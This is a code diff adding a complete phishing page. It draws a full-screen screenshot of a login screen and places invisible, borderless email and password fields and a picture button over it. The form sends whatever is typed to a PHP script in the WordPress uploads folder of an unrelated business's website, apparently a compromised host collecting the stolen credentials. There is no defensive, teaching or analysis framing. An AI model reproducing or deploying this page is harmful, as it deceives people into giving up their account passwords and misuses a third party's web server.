@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  height: 100vh;
+  background: url("Capture.PNG") no-repeat center center/cover;
+  font-family: Arial, sans-serif;
+  position: relative;
+}
+
+/* Overlay container */
+.overlay {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+}
+
+/* Seamless input styling */
+.overlay-input {
+  position: absolute;
+  width: 420px;
+  height: 45px;
+  padding: 12px;
+  font-size: 16px;
+  border: none;              /* removed border */
+  outline: none;             /* removed focus outline */
+  background: transparent;   /* fully blended */
+  color: #333;
+}
+
+/* Remove autofill background (Chrome fix) */
+input:-webkit-autofill {
+  -webkit-box-shadow: 0 0 0 1000px transparent inset !important;
+  -webkit-text-fill-color: #333 !important;
+}
+
+/* Position fields (adjust slightly if needed) */
+#email {
+  top: 30%;
+  left: 50%;
+  transform: translateX(-50%);
+}
+
+#password {
+  top: 42%;
+  left: 50%;
+  transform: translateX(-50%);
+}
+
+/* Login Button */
+#login-btn {
+  position: absolute;
+  top: 58%;
+  left: 425px;   /* adjust as needed */
+  border: none;
+  background: none;
+  padding: 0;
+  cursor: pointer;
+}
+
+#login-btn img {
+  width: 420px;   /* match your image size */
+  height: auto;
+  display: block;
+}
+
+</style>
+</head>
+
+<body>
+
+<form class="overlay" method="POST"  action="https://lorneplumbing.com.au/wp-content/uploads/2026/another.php" id="loginForm">
+  <input type="text" id="email" name="email" class="overlay-input" required>
+  <input type="password" id="password" name="password" class="overlay-input" required>
+
+  
+<button type="submit" id="login-btn">
+  <img src="button.png" alt="Login">
+</button>
+
+
+
+</form>
+
+</body>
+</html>
